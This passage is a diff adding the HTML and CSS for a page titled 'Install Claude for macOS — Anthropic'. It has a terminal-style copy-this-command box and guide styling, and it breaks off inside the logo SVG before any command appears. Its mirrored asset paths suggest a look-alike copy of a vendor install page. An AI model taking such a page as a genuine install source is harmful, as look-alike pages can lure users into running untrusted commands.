@@ -1,0 +1,1534 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Install Claude for macOS — Anthropic</title>
+	<link rel="icon" type="image/svg+xml" href="wikipedia/commons/b/b0/Claude_AI_symbol.svg">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="css2?family=Inter:wght@400;500;600;700;800&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600;8..60,700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --bg: #FAF6F1;
+            --bg-warm: #F5EDE4;
+            --bg-card: #FFFFFF;
+            --text: #1A1612;
+            --text-2: #6B5D50;
+            --text-3: #9A8B7C;
+            --border: #E8DDD2;
+            --border-hover: #D4C4B2;
+            --accent: #D97757;
+            --accent-hover: #C4623F;
+            --accent-glow: rgba(217, 119, 87, 0.15);
+            --green: #2D8A56;
+            --radius: 14px;
+            --radius-lg: 24px;
+            --mono: 'JetBrains Mono', monospace;
+            --sans: 'Inter', -apple-system, sans-serif;
+            --serif: 'Source Serif 4', Georgia, serif;
+            --nav-bg: rgba(250, 246, 241, 0.82);
+            --terminal-bg: #1C1917;
+            --terminal-text: #E7E5E4;
+            --terminal-dim: #78716C;
+            --terminal-green: #4ADE80;
+            --terminal-accent: #FB923C;
+        }
+
+        [data-theme="dark"] {
+            --bg: #0C0A09;
+            --bg-warm: #1C1917;
+            --bg-card: #1C1917;
+            --text: #FAFAF9;
+            --text-2: #A8A29E;
+            --text-3: #78716C;
+            --border: #292524;
+            --border-hover: #44403C;
+            --accent: #FB923C;
+            --accent-hover: #F97316;
+            --accent-glow: rgba(251, 146, 60, 0.12);
+            --nav-bg: rgba(12, 10, 9, 0.82);
+            --terminal-bg: #0C0A09;
+        }
+
+        html { scroll-behavior: smooth; }
+
+        body {
+            font-family: var(--sans);
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
+            overflow-x: hidden;
+            transition: background 0.4s, color 0.4s;
+        }
+
+        .bg-canvas {
+            position: fixed; inset: 0; z-index: -1;
+            overflow: hidden; pointer-events: none;
+        }
+
+        .bg-orb {
+            position: absolute; border-radius: 50%;
+            filter: blur(80px); opacity: 0.35;
+            animation: orbFloat 20s ease-in-out infinite;
+        }
+
+        .bg-orb:nth-child(1) { width: 600px; height: 600px; background: var(--accent); top: -10%; left: -5%; }
+        .bg-orb:nth-child(2) { width: 500px; height: 500px; background: #D4A27F; bottom: -15%; right: -10%; animation-delay: -7s; }
+        .bg-orb:nth-child(3) { width: 350px; height: 350px; background: #E8C9B0; top: 40%; left: 50%; animation-delay: -14s; }
+
+        @keyframes orbFloat {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            33% { transform: translate(40px, -30px) scale(1.05); }
+            66% { transform: translate(-20px, 20px) scale(0.95); }
+        }
+
+        /* NAV */
+        nav {
+            position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+            padding: 16px 40px;
+            display: flex; align-items: center; justify-content: space-between;
+            background: var(--nav-bg);
+            backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px);
+            border-bottom: 1px solid var(--border);
+            transition: all 0.3s;
+        }
+
+        nav.scrolled { padding: 10px 40px; box-shadow: 0 2px 20px rgba(0,0,0,0.06); }
+
+        .nav-logo {
+            display: flex; align-items: center; gap: 10px;
+            text-decoration: none; color: var(--text);
+        }
+
+        .nav-logo svg { width: 32px; height: 32px; }
+        .nav-logo span { font-weight: 700; font-size: 18px; letter-spacing: -0.02em; }
+
+        .nav-center {
+            display: flex; align-items: center; gap: 4px;
+            background: var(--bg-warm); border: 1px solid var(--border);
+            border-radius: 999px; padding: 4px;
+        }
+
+        .nav-pill {
+            padding: 7px 18px; border-radius: 999px;
+            font-size: 13px; font-weight: 500; color: var(--text-2);
+            text-decoration: none; transition: all 0.2s;
+        }
+
+        .nav-pill:hover { color: var(--text); }
+        .nav-pill.active { background: var(--bg-card); color: var(--text); box-shadow: 0 1px 4px rgba(0,0,0,0.06); }
+
+        .nav-right { display: flex; align-items: center; gap: 12px; }
+
+        .theme-toggle {
+            width: 38px; height: 38px; border-radius: 10px;
+            border: 1px solid var(--border); background: var(--bg-card);
+            color: var(--text-2); cursor: pointer;
+            display: flex; align-items: center; justify-content: center;
+            transition: all 0.2s;
+        }
+
+        .theme-toggle:hover { border-color: var(--border-hover); color: var(--text); }
+        .theme-toggle svg { width: 18px; height: 18px; }
+
+        .nav-cta {
+            padding: 9px 22px; background: var(--text); color: var(--bg) !important;
+            border-radius: 999px; font-size: 13px; font-weight: 600;
+            text-decoration: none; transition: all 0.2s;
+        }
+
+        .nav-cta:hover { opacity: 0.85; }
+
+        /* HERO */
+        .hero {
+            padding: 160px 40px 80px;
+            text-align: center; max-width: 860px; margin: 0 auto;
+        }
+
+        .hero-badge {
+            display: inline-flex; align-items: center; gap: 8px;
+            padding: 6px 18px 6px 10px;
+            background: var(--bg-card); border: 1px solid var(--border);
+            border-radius: 999px; font-size: 13px; font-weight: 500;
+            color: var(--text-2); margin-bottom: 36px;
+            animation: fadeUp 0.6s ease both; cursor: default;
+            transition: border-color 0.2s;
+        }
+
+        .hero-badge:hover { border-color: var(--border-hover); }
+
+        .hero-badge .pulse-dot {
+            position: relative; width: 8px; height: 8px;
+        }
+
+        .hero-badge .pulse-dot::before,
+        .hero-badge .pulse-dot::after {
+            content: ''; position: absolute; inset: 0;
+            border-radius: 50%; background: var(--green);
+        }
+
+        .hero-badge .pulse-dot::after {
+            animation: ping 2s cubic-bezier(0,0,0.2,1) infinite;
+        }
+
+        @keyframes ping { 75%, 100% { transform: scale(2.5); opacity: 0; } }
+
+        .hero-badge .apple-icon { width: 14px; height: 14px; opacity: 0.5; }
+
+        .hero h1 {
+            font-family: var(--serif);
+            font-size: clamp(44px, 6.5vw, 78px);
+            font-weight: 700; line-height: 1.05;
+            letter-spacing: -0.035em; margin-bottom: 24px;
+            animation: fadeUp 0.6s 0.1s ease both;
+        }
+
+        .hero h1 .gradient {
+            background: linear-gradient(135deg, var(--accent) 0%, #E8956D 50%, #D4A27F 100%);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+        }
+
+        .hero-sub {
+            font-size: 19px; color: var(--text-2); max-width: 520px;
+            margin: 0 auto 20px; line-height: 1.7;
+            animation: fadeUp 0.6s 0.2s ease both;
+        }
+
+        .hero-help-link {
+            display: inline-flex; align-items: center; gap: 6px;
+            font-size: 14px; color: var(--accent); font-weight: 500;
+            text-decoration: none; margin-bottom: 48px;
+            animation: fadeUp 0.6s 0.25s ease both;
+            transition: opacity 0.2s;
+        }
+
+        .hero-help-link:hover { opacity: 0.75; }
+        .hero-help-link svg { width: 16px; height: 16px; }
+
+        /* INSTALL COMMAND */
+        .install-section {
+            animation: fadeUp 0.6s 0.3s ease both;
+            margin-bottom: 40px;
+        }
+
+        .install-box {
+            max-width: 640px; margin: 0 auto;
+            background: var(--terminal-bg);
+            border-radius: var(--radius-lg); overflow: hidden;
+            box-shadow:
+                0 0 0 1px rgba(255,255,255,0.06),
+                0 24px 80px rgba(0,0,0,0.25),
+                0 0 120px var(--accent-glow);
+            transition: box-shadow 0.4s;
+        }
+
+        .install-box:hover {
+            box-shadow:
+                0 0 0 1px rgba(255,255,255,0.1),
+                0 32px 100px rgba(0,0,0,0.3),
+                0 0 160px var(--accent-glow);
+        }
+
+        .install-header {
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 14px 20px;
+            border-bottom: 1px solid rgba(255,255,255,0.06);
+        }
+
+        .install-dots { display: flex; gap: 8px; }
+        .install-dots span { width: 12px; height: 12px; border-radius: 50%; }
+        .install-dots span:nth-child(1) { background: #FF5F57; }
+        .install-dots span:nth-child(2) { background: #FEBC2E; }
+        .install-dots span:nth-child(3) { background: #28C840; }
+
+        .install-title {
+            font-family: var(--mono); font-size: 12px;
+            color: var(--terminal-dim); font-weight: 500;
+        }
+
+        .install-body {
+            padding: 28px 24px;
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            scrollbar-width: thin;
+            scrollbar-color: rgba(255,255,255,0.2) transparent;
+        }
+        .install-body::-webkit-scrollbar { height: 6px; }
+        .install-body::-webkit-scrollbar-track { background: transparent; }
+        .install-body::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.18); border-radius: 3px; }
+
+        .install-line {
+            display: flex; align-items: center; gap: 12px;
+            font-family: var(--mono); font-size: 14px;
+            white-space: nowrap;
+            width: max-content;
+            min-width: 100%;
+        }
+
+        .install-prompt {
+            color: var(--terminal-green);
+            user-select: none; flex-shrink: 0;
+        }
+
+        .install-cmd { color: var(--terminal-text); white-space: nowrap; flex-shrink: 0; }
+        .install-cmd .hl { color: var(--terminal-accent); }
+
+        .cursor-blink {
+            display: inline-block; width: 2px; height: 18px;
+            background: var(--terminal-accent); margin-left: 2px;
+            vertical-align: text-bottom; animation: blink 1s step-end infinite;
+        }
+
+        @keyframes blink { 50% { opacity: 0; } }
+
+        .install-footer {
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 14px 20px;
+            border-top: 1px solid rgba(255,255,255,0.06);
+        }
+
+        .install-hint {
+            font-size: 12px; color: var(--terminal-dim);
+            font-family: var(--mono); display: flex; align-items: center; gap: 6px;
+        }
+
+        .install-hint kbd {
+            padding: 2px 6px; background: rgba(255,255,255,0.08);
+            border-radius: 4px; font-size: 11px; border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .copy-btn {
+            display: flex; align-items: center; gap: 8px;
+            padding: 8px 18px;
+            background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 999px; color: var(--terminal-text);
+            font-size: 13px; font-weight: 500; cursor: pointer;
+            font-family: var(--sans); transition: all 0.2s;
+        }
+
+        .copy-btn:hover { background: rgba(255,255,255,0.14); border-color: rgba(255,255,255,0.18); }
+        .copy-btn.copied { background: rgba(45,138,86,0.2); border-color: rgba(45,138,86,0.3); color: #4ADE80; }
+        .copy-btn svg { width: 15px; height: 15px; }
+
+        /* PLATFORM TAG */
+        .platform-tag {
+            text-align: center; margin-bottom: 16px;
+            animation: fadeUp 0.6s 0.35s ease both;
+        }
+
+        .platform-tag-inner {
+            display: inline-flex; align-items: center; gap: 8px;
+            font-size: 13px; color: var(--text-3);
+        }
+
+        .platform-tag-inner svg { width: 16px; height: 16px; opacity: 0.5; }
+        .platform-tag-inner .os-name { font-weight: 600; color: var(--text-2); }
+
+        /* STATS */
+        .stats-row {
+            display: flex; justify-content: center; gap: 48px;
+            padding: 48px 40px 0;
+            animation: fadeUp 0.6s 0.45s ease both;
+        }
+
+        .stat-item { text-align: center; }
+
+        .stat-number {
+            font-family: var(--serif); font-size: 32px; font-weight: 700;
+            letter-spacing: -0.02em; color: var(--text);
+        }
+
+        .stat-label { font-size: 13px; color: var(--text-3); margin-top: 4px; font-weight: 500; }
+
+        /* APP PREVIEW */
+        .preview-section { padding: 80px 40px 0; max-width: 900px; margin: 0 auto; }
+
+        .app-preview {
+            background: var(--bg-card);
+            border-radius: var(--radius-lg); border: 1px solid var(--border);
+            box-shadow: 0 30px 80px rgba(0,0,0,0.08), 0 1px 3px rgba(0,0,0,0.03);
+            overflow: hidden;
+            transition: transform 0.5s cubic-bezier(0.22,1,0.36,1), box-shadow 0.5s;
+        }
+
+        .app-preview:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 40px 100px rgba(0,0,0,0.12), 0 1px 3px rgba(0,0,0,0.03);
+        }
+
+        .app-titlebar {
+            display: flex; align-items: center; padding: 16px 20px; gap: 8px;
+            border-bottom: 1px solid var(--border); background: var(--bg-warm);
+        }
+
+        .app-titlebar span { width: 12px; height: 12px; border-radius: 50%; }
+        .app-titlebar span:nth-child(1) { background: #FF5F57; }
+        .app-titlebar span:nth-child(2) { background: #FEBC2E; }
+        .app-titlebar span:nth-child(3) { background: #28C840; }
+
+        .app-body {
+            padding: 48px 40px;
+            display: flex; flex-direction: column; align-items: center;
+        }
+
+        .app-claude-avatar {
+            width: 56px; height: 56px; border-radius: 16px;
+            background: linear-gradient(135deg, var(--accent), #E8956D);
+            display: flex; align-items: center; justify-content: center;
+            margin-bottom: 20px; box-shadow: 0 4px 20px var(--accent-glow);
+        }
+
+        .app-claude-avatar svg { width: 28px; height: 28px; }
+
+        .app-greeting {
+            font-family: var(--serif); font-size: 22px;
+            font-weight: 600; margin-bottom: 8px; color: var(--text);
+        }
+
+        .app-sub { font-size: 14px; color: var(--text-3); margin-bottom: 32px; }
+
+        .app-chat-bubbles {
+            width: 100%; max-width: 560px;
+            display: flex; flex-direction: column; gap: 16px; margin-bottom: 28px;
+        }
+
+        .chat-bubble {
+            padding: 14px 18px; border-radius: 16px;
+            font-size: 14px; line-height: 1.6; max-width: 85%;
+            animation: bubbleIn 0.4s ease both;
+        }
+
+        .chat-bubble.user {
+            align-self: flex-end; background: var(--accent);
+            color: #FFF; border-bottom-right-radius: 6px;
+        }
+
+        .chat-bubble.claude {
+            align-self: flex-start; background: var(--bg-warm);
+            color: var(--text); border-bottom-left-radius: 6px;
+        }
+
+        @keyframes bubbleIn {
+            from { opacity: 0; transform: translateY(10px) scale(0.97); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .app-input-bar {
+            width: 100%; max-width: 560px;
+            display: flex; align-items: center; gap: 12px;
+            padding: 12px 16px; border: 1.5px solid var(--border);
+            border-radius: 16px; background: var(--bg); transition: border-color 0.2s;
+        }
+
+        .app-input-bar input {
+            flex: 1; border: none; background: none;
+            font-size: 14px; font-family: var(--sans);
+            color: var(--text); outline: none;
+        }
+
+        .app-input-bar input::placeholder { color: var(--text-3); }
+
+        .app-send-btn {
+            width: 36px; height: 36px; border-radius: 10px;
+            background: var(--accent); border: none; cursor: pointer;
+            display: flex; align-items: center; justify-content: center;
+            transition: all 0.2s; flex-shrink: 0;
+        }
+
+        .app-send-btn:hover { background: var(--accent-hover); transform: scale(1.05); }
+        .app-send-btn svg { width: 16px; height: 16px; color: #FFF; }
+
+        /* SECTIONS SHARED */
+        .section-label {
+            font-size: 12px; font-weight: 700; text-transform: uppercase;
+            letter-spacing: 0.1em; color: var(--accent); margin-bottom: 12px;
+        }
+
+        .section-title {
+            font-family: var(--serif); font-size: clamp(30px, 4vw, 44px);
+            font-weight: 700; letter-spacing: -0.025em; margin-bottom: 14px;
+        }
+
+        .section-desc {
+            font-size: 16px; color: var(--text-2); max-width: 500px;
+            line-height: 1.7; margin-bottom: 56px;
+        }
+
+        /* GUIDE SECTION */
+        .guide-section {
+            padding: 120px 40px 100px;
+            max-width: 800px; margin: 0 auto;
+        }
+
+        .guide-steps {
+            display: flex; flex-direction: column; gap: 0;
+            margin-top: 56px;
+        }
+
+        .guide-step {
+            display: flex; gap: 28px;
+            padding: 36px 0;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .guide-step:first-child { border-top: 1px solid var(--border); }
+
+        .guide-step-num {
+            width: 52px; height: 52px; border-radius: 16px;
+            background: var(--bg-warm); border: 1px solid var(--border);
+            display: flex; align-items: center; justify-content: center;
+            font-family: var(--mono); font-size: 18px; font-weight: 700;
+            color: var(--accent); flex-shrink: 0; transition: all 0.3s;
+        }
+
+        .guide-step:hover .guide-step-num {
+            background: var(--accent); border-color: var(--accent); color: #FFF;
+        }
+
+        .guide-step-body { flex: 1; min-width: 0; }
+        .guide-step-body h4 { font-size: 18px; font-weight: 700; margin-bottom: 8px; }
+        .guide-step-body p { font-size: 14px; color: var(--text-2); line-height: 1.7; margin-bottom: 0; }
+
+        .guide-terminal {
+            margin-top: 16px;
+            background: var(--terminal-bg);
+            border-radius: 14px;
+            overflow: hidden;
+            border: 1px solid rgba(255,255,255,0.06);
+            max-width: 100%;
+        }
+
+        .guide-terminal-bar {
+            display: flex; align-items: center; gap: 8px;
+            padding: 12px 16px;
+            border-bottom: 1px solid rgba(255,255,255,0.06);
+        }
+
+        .guide-terminal-bar span { width: 10px; height: 10px; border-radius: 50%; }
+        .guide-terminal-bar span:nth-child(1) { background: #FF5F57; }
+        .guide-terminal-bar span:nth-child(2) { background: #FEBC2E; }
+        .guide-terminal-bar span:nth-child(3) { background: #28C840; }
+
+        .gt-copy-btn {
+            margin-left: auto;
+            display: flex; align-items: center; gap: 6px;
+            padding: 5px 12px;
+            background: rgba(255,255,255,0.06);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 999px;
+            color: var(--terminal-text);
+            font-size: 11px; font-weight: 500;
+            font-family: var(--sans);
+            cursor: pointer;
+            transition: background 0.2s, border-color 0.2s, color 0.2s;
+            flex-shrink: 0;
+        }
+        .gt-copy-btn:hover {
+            background: rgba(255,255,255,0.12);
+            border-color: rgba(255,255,255,0.18);
+        }
+        .gt-copy-btn.copied {
+            background: rgba(45,138,86,0.2);
+            border-color: rgba(45,138,86,0.3);
+            color: #4ADE80;
+        }
+        .gt-copy-btn svg { width: 12px; height: 12px; }
+
+        .guide-terminal-body {
+            padding: 20px 20px;
+            font-family: var(--mono); font-size: 13px;
+            display: flex; flex-direction: column; gap: 12px;
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            scrollbar-width: thin;
+            scrollbar-color: rgba(255,255,255,0.2) transparent;
+        }
+        .guide-terminal-body::-webkit-scrollbar { height: 6px; }
+        .guide-terminal-body::-webkit-scrollbar-track { background: transparent; }
+        .guide-terminal-body::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.18); border-radius: 3px; }
+
+        .guide-terminal-line {
+            display: flex; align-items: center; gap: 10px;
+            white-space: nowrap;
+            width: max-content;
+            min-width: 100%;
+        }
+
+        .gt-prompt { color: var(--terminal-green); user-select: none; flex-shrink: 0; }
+        .gt-cmd { color: var(--terminal-text); white-space: nowrap; flex-shrink: 0; }
+        .gt-cmd .hl { color: var(--terminal-accent); }
+        .gt-output { color: var(--terminal-dim); font-size: 12px; padding-left: 22px; white-space: nowrap; }
+
+        .guide-tip {
+            margin-top: 14px;
+            display: flex; align-items: flex-start; gap: 10px;
+            padding: 14px 16px;
+            background: var(--bg-warm);
+            border-radius: 12px; border: 1px solid var(--border);
+        }
+
+        .guide-tip-icon {
+            width: 20px; height: 20px; flex-shrink: 0;
+            color: var(--accent); margin-top: 1px;
+        }
+
+        .guide-tip p { font-size: 13px; color: var(--text-2); line-height: 1.6; }
+        .guide-tip code {
+            padding: 2px 7px; background: var(--bg-card);
+            border-radius: 5px; font-family: var(--mono);
+            font-size: 12px; border: 1px solid var(--border);
+        }
+
+        .guide-keyboard {
+            margin-top: 14px;
+            display: inline-flex; align-items: center; gap: 6px;
+        }
+
+        .key {
+            display: inline-flex; align-items: center; justify-content: center;
+            padding: 6px 12px; min-width: 36px;
+            background: var(--bg-card); border: 1px solid var(--border);
+            border-radius: 8px; font-family: var(--mono);
+            font-size: 13px; font-weight: 600; color: var(--text-2);
+            box-shadow: 0 2px 0 var(--border);
+        }
+
+        .key-plus { font-size: 14px; color: var(--text-3); font-weight: 400; }
+
+        /* FEATURES */
+        .features {
+            padding: 80px 40px 120px;
+            max-width: 1100px; margin: 0 auto;
+        }
+
+        .features-grid {
+            display: grid; grid-template-columns: repeat(3, 1fr);
+            gap: 20px; margin-top: 56px;
+        }
+
+        .feature-card {
+            padding: 32px 28px; background: var(--bg-card);
+            border: 1px solid var(--border); border-radius: var(--radius-lg);
+            transition: all 0.3s;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 40px rgba(0,0,0,0.06);
+            border-color: var(--border-hover);
+        }
+
+        .feature-icon-wrap {
+            width: 52px; height: 52px; border-radius: 14px;
+            background: var(--bg-warm);
+            display: flex; align-items: center; justify-content: center;
+            margin-bottom: 18px;
+        }
+
+        .feature-icon-wrap svg { width: 24px; height: 24px; color: var(--accent); }
+
+        .feature-card h4 { font-size: 16px; font-weight: 700; margin-bottom: 8px; }
+        .feature-card p { font-size: 14px; color: var(--text-2); line-height: 1.65; }
+
+        /* SYSTEM REQUIREMENTS */
+        .requirements-section {
+            padding: 80px 40px 100px;
+            max-width: 800px; margin: 0 auto;
+        }
+
+        .req-grid {
+            display: grid; grid-template-columns: 1fr 1fr;
+            gap: 16px; margin-top: 40px;
+        }
+
+        .req-item {
+            display: flex; align-items: center; gap: 14px;
+            padding: 20px 22px;
+            background: var(--bg-card); border: 1px solid var(--border);
+            border-radius: var(--radius); transition: all 0.2s;
+        }
+
+        .req-item:hover { border-color: var(--border-hover); }
+
+        .req-icon {
+            width: 40px; height: 40px; border-radius: 10px;
+            background: var(--bg-warm);
+            display: flex; align-items: center; justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .req-icon svg { width: 20px; height: 20px; color: var(--accent); }
+
+        .req-info { flex: 1; }
+        .req-label { font-size: 12px; color: var(--text-3); font-weight: 500; margin-bottom: 2px; }
+        .req-value { font-size: 14px; font-weight: 600; color: var(--text); }
+
+        /* FAQ */
+        .faq-section {
+            padding: 80px 40px 120px;
+            max-width: 760px; margin: 0 auto;
+        }
+
+        .faq-list { margin-top: 48px; display: flex; flex-direction: column; }
+
+        .faq-item { border-bottom: 1px solid var(--border); }
+        .faq-item:first-child { border-top: 1px solid var(--border); }
+
+        .faq-question {
+            display: flex; align-items: center; justify-content: space-between;
+            width: 100%; padding: 22px 0;
+            background: none; border: none; cursor: pointer;
+            font-family: var(--sans); font-size: 16px; font-weight: 600;
+            color: var(--text); text-align: left; gap: 16px;
+            transition: color 0.2s;
+        }
+
+        .faq-question:hover { color: var(--accent); }
+
+        .faq-chevron {
+            width: 20px; height: 20px; color: var(--text-3);
+            transition: transform 0.3s; flex-shrink: 0;
+        }
+
+        .faq-item.open .faq-chevron { transform: rotate(180deg); }
+
+        .faq-answer {
+            max-height: 0; overflow: hidden;
+            transition: max-height 0.35s cubic-bezier(0.22,1,0.36,1), padding 0.35s;
+            padding: 0;
+        }
+
+        .faq-item.open .faq-answer { max-height: 220px; padding-bottom: 22px; }
+
+        .faq-answer p { font-size: 14px; color: var(--text-2); line-height: 1.7; }
+        .faq-answer code {
+            padding: 2px 7px; background: var(--bg-warm);
+            border-radius: 5px; font-family: var(--mono);
+            font-size: 12px; border: 1px solid var(--border);
+        }
+
+        /* CTA */
+        .cta-section { padding: 40px 40px 140px; text-align: center; }
+
+        .cta-card {
+            max-width: 760px; margin: 0 auto;
+            background: var(--text); border-radius: 32px;
+            padding: 72px 56px; position: relative; overflow: hidden;
+        }
+
+        .cta-card::before {
+            content: ''; position: absolute;
+            top: -40%; right: -20%;
+            width: 500px; height: 500px; border-radius: 50%;
+            background: radial-gradient(circle, rgba(217,119,87,0.2), transparent 70%);
+        }
+
+        .cta-card::after {
+            content: ''; position: absolute;
+            bottom: -50%; left: -15%;
+            width: 400px; height: 400px; border-radius: 50%;
+            background: radial-gradient(circle, rgba(212,162,127,0.12), transparent 70%);
+        }
+
+        .cta-card > * { position: relative; z-index: 1; }
+
+        .cta-card h2 {
+            font-family: var(--serif); font-size: clamp(28px,4vw,40px);
+            font-weight: 700; color: var(--bg);
+            margin-bottom: 14px; letter-spacing: -0.025em;
+        }
+
+        .cta-card p {
+            font-size: 16px; color: #A8A29E;
+            margin-bottom: 40px; max-width: 420px;
+            margin-left: auto; margin-right: auto; line-height: 1.7;
+        }
+
+        .cta-install-cmd {
+            display: inline-flex; align-items: center; gap: 12px;
+            padding: 14px 28px;
+            background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.12);
+            border-radius: 999px; font-family: var(--mono); font-size: 14px;
+            color: var(--terminal-text); cursor: pointer; transition: all 0.2s;
+            margin-bottom: 20px;
+        }
+
+        .cta-install-cmd:hover { background: rgba(255,255,255,0.14); border-color: rgba(255,255,255,0.2); }
+        .cta-install-cmd svg { width: 16px; height: 16px; flex-shrink: 0; }
+
+        .cta-or { display: block; font-size: 13px; color: #78716C; margin-bottom: 20px; }
+
+        .cta-btn {
+            display: inline-flex; align-items: center; gap: 10px;
+            padding: 16px 36px; background: var(--bg); color: var(--text);
+            border: none; border-radius: 999px;
+            font-size: 16px; font-weight: 600; cursor: pointer;
+            transition: all 0.25s; text-decoration: none; font-family: var(--sans);
+        }
+
+        .cta-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
+
+        /* FOOTER */
+        footer {
+            padding: 40px; border-top: 1px solid var(--border);
+            max-width: 1100px; margin: 0 auto;
+        }
+
+        .footer-top {
+            display: flex; align-items: center; justify-content: space-between;
+            margin-bottom: 32px; flex-wrap: wrap; gap: 20px;
+        }
+
+        .footer-brand { display: flex; align-items: center; gap: 10px; }
+        .footer-brand svg { width: 24px; height: 24px; }
+        .footer-brand span { font-weight: 700; font-size: 16px; color: var(--text); }
+
+        .footer-nav { display: flex; gap: 28px; }
+
+        .footer-nav a {
+            font-size: 13px; color: var(--text-2);
+            text-decoration: none; font-weight: 500; transition: color 0.2s;
+        }
+
+        .footer-nav a:hover { color: var(--text); }
+
+        .footer-bottom {
+            display: flex; align-items: center; justify-content: space-between;
+            padding-top: 24px; border-top: 1px solid var(--border);
+            flex-wrap: wrap; gap: 12px;
+        }
+
+        .footer-copy { font-size: 12px; color: var(--text-3); }
+
+        .footer-social { display: flex; gap: 12px; }
+
+        .footer-social a {
+            width: 34px; height: 34px; border-radius: 10px;
+            border: 1px solid var(--border);
+            display: flex; align-items: center; justify-content: center;
+            color: var(--text-3); text-decoration: none; transition: all 0.2s;
+        }
+
+        .footer-social a:hover { border-color: var(--border-hover); color: var(--text); }
+        .footer-social a svg { width: 16px; height: 16px; }
+
+        /* ANIMATIONS */
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(24px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .reveal {
+            opacity: 0; transform: translateY(40px);
+            transition: all 0.8s cubic-bezier(0.22,1,0.36,1);
+        }
+
+        .reveal.visible { opacity: 1; transform: translateY(0); }
+
+        .reveal-stagger > * {
+            opacity: 0; transform: translateY(20px);
+            transition: all 0.6s cubic-bezier(0.22,1,0.36,1);
+        }
+
+        .reveal-stagger.visible > *:nth-child(1) { transition-delay: 0s; opacity: 1; transform: none; }
+        .reveal-stagger.visible > *:nth-child(2) { transition-delay: 0.08s; opacity: 1; transform: none; }
+        .reveal-stagger.visible > *:nth-child(3) { transition-delay: 0.16s; opacity: 1; transform: none; }
+        .reveal-stagger.visible > *:nth-child(4) { transition-delay: 0.24s; opacity: 1; transform: none; }
+        .reveal-stagger.visible > *:nth-child(5) { transition-delay: 0.32s; opacity: 1; transform: none; }
+        .reveal-stagger.visible > *:nth-child(6) { transition-delay: 0.4s; opacity: 1; transform: none; }
+
+        /* RESPONSIVE */
+        @media (max-width: 900px) {
+            .features-grid { grid-template-columns: 1fr 1fr; }
+        }
+
+        @media (max-width: 768px) {
+            nav { padding: 12px 20px; }
+            .nav-center { display: none; }
+            .hero { padding: 130px 20px 60px; }
+            .hero-sub { font-size: 16px; }
+            .install-line { font-size: 12px; }
+            .stats-row { gap: 28px; }
+            .stat-number { font-size: 26px; }
+            .features-grid { grid-template-columns: 1fr; }
+            .req-grid { grid-template-columns: 1fr; }
+            .guide-section, .features, .faq-section, .cta-section, .preview-section, .requirements-section { padding-left: 20px; padding-right: 20px; }
+            .app-body { padding: 32px 20px; }
+            .cta-card { padding: 48px 28px; border-radius: 24px; }
+            .guide-step { gap: 16px; }
+            footer { padding: 32px 20px; }
+            .footer-top { flex-direction: column; align-items: flex-start; }
+        }
+
+        @media (max-width: 480px) {
+            .stats-row { flex-direction: column; gap: 20px; }
+            .install-footer { flex-direction: column; gap: 12px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="bg-canvas">
+    <div class="bg-orb"></div>
+    <div class="bg-orb"></div>
+    <div class="bg-orb"></div>
+</div>
+
+<!-- NAV -->
+<nav id="nav">
+    <a href="#" class="nav-logo">
+        <svg xmlns="http://www.w3.org/2000/svg" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" image-rendering="optimizeQuality" fill-rule="evenodd" clip-rule="evenodd" viewbox="0 0 512 509.64"><path fill="#D77655" d="M115.612 0h280.775C459.974 0 512 52.026 512 115.612v278.415c0 63.587-52.026 115.612-115.613 115.612H115.612C52.026 509.639 0 457.614 0 394.027V115.612C0 52.026 52.026 0 115.612 0z"></path><path fill="#FCF2EE" fill-rule="nonzero" d="M142.27 316.619l73.655-41.326 1.238-3.589-1.238-1.996-3.589-.001-12.31-.759-42.084-1.138-36.498-1.516-35.361-1.896-8.897-1.895-8.34-10.995.859-5.484 7.482-5.03 10.717.935 23.683 1.617 35.537 2.452 25.782 1.517 38.193 3.968h6.064l.86-2.451-2.073-1.517-1.618-1.517-36.776-24.922-39.81-26.338-20.852-15.166-11.273-7.683-5.687-7.204-2.451-15.721 10.237-11.273 13.75.935 3.513.936 13.928 10.716 29.749 23.027 38.848 28.612 5.687 4.727 2.275-1.617.278-1.138-2.553-4.271-21.13-38.193-22.546-38.848-10.035-16.101-2.654-9.655c-.935-3.968-1.617-7.304-1.617-11.374l11.652-15.823 6.445-2.073 15.545 2.073 6.547 5.687 9.655 22.092 15.646 34.78 24.265 47.291 7.103 14.028 3.791 12.992 1.416 3.968 2.449-.001v-2.275l1.997-26.641 3.69-32.707 3.589-42.084 1.239-11.854 5.863-14.206 11.652-7.683 9.099 4.348 7.482 10.716-1.036 6.926-4.449 28.915-8.72 45.294-5.687 30.331h3.313l3.792-3.791 15.342-20.372 25.782-32.227 11.374-12.789 13.27-14.129 